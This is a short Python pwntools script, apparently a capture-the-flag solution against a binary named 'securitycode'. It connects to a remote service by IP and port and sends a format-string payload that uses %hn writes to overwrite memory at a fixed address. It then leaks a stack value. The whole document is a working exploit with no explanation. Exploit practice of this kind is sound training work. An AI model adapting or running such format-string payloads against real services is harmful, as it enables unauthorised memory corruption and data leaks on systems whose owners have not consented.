from pwn import *

io = process('./securitycode')
io = remote('185.235.41.205', 7040)
payload = p32(0x804c03c+2) + p32(0x804c03c) + b'%43941x%15$hn%8017x%16$hn'

print(io.recv())
io.sendline(b'A')
print(io.recv())
io.sendline(payload)
io.sendline(b'%21$x')
print(io.recvall())
